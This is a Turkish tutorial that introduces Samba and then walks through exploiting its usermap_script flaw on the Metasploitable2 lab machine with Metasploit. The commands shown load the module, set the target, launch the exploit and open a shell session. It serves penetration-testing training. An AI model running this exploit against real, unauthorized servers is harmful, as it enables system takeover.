## 🖥️ SAMBA Nedir?  

**Samba**, Windows 🪟 ile Linux 🐧/Unix sistemleri arasında **dosya 📂 ve yazıcı 🖨️ paylaşımı** yapmayı sağlayan **açık kaynaklı** bir yazılımdır.  

### 🔹 Ne İşe Yarar?
- 💬 **SMB/CIFS** protokolünü kullanarak iki farklı işletim sistemi arasında iletişim sağlar.  
- 📂 Klasör ve dosya paylaşımı yapar.  
- 🖨️ Yazıcı paylaşımını mümkün kılar.  
- 🛡️ Linux sistemini **Windows ağına entegre** eder (dosya sunucusu / domain denetleyicisi gibi).  

### 🔹 Nerede Kullanılır?
- 🏢 Şirket ağlarında  
- 🏠 Ev ağlarında  
- 🔄 Windows + Linux karma ağlarda  

✨ **Kısacası:** Samba, farklı işletim sistemlerini **tek bir ağda uyumlu** hale getirir.

---

## 🛠️ smbd 3.X - 4.X Versiyon Açığı

Metasploitable2’deki Samba sürümünde, **internet araması** ile tespit edilebilen bir güvenlik açığı bulunur.  
Genellikle ilk sonuçlarda **Rapid7** tarafından hazırlanmış bir **Metasploit modülü** yer alır.  

---

### 🚀 Exploit Kullanımı (Metasploit Framework)

1. **Metasploit Framework’ü başlat**  
   Bu komut ile Metasploit konsolunu açıyoruz.
```bash
msfconsole
```

2. **Açığı kullanacak modülü seç**  
   Burada Samba `usermap_script` açığını kullanan exploit modülünü yüklüyoruz.
```bash
use exploit/multi/samba/usermap_script
```

3. **Hedef ve gerekli parametreleri ayarla**  
   - `show targets` → Hedef türlerini gösterir  
   - `set target 0` → Varsayılan hedefi seçer  
   - `show options` → Modülün mevcut ayarlarını listeler  
   - `set rhosts <target ip>` → Hedef IP adresini ayarlar
```bash
show targets
set target 0
show options
set rhosts <target ip>
```

4. **Exploit’i çalıştır**  
   - `-j` → Arka planda (background) çalıştırır  
   - `-z` → Oturumu otomatik olarak kapatmaz
```bash
exploit -j -z
```

5. **Oturumları görüntüle ve bağlan**  
   - `sessions -l` → Açık tüm oturumları listeler  
   - `sessions 1` → 1 numaralı oturuma bağlanır
```bash
sessions -l
sessions 1
```

6. **İşlem bittiğinde çıkış yap**  
   - `background` → Oturumu arka plana alır  
   - `exit` → Metasploit’ten çıkar
```bash
background
exit
```

---

⚠️ **Not:** Bu işlem yalnızca **laboratuvar ortamında** ve **izinli sistemlerde** yapılmalıdır.  
Aksi halde **yasal sorunlar** doğurabilir! 🚫

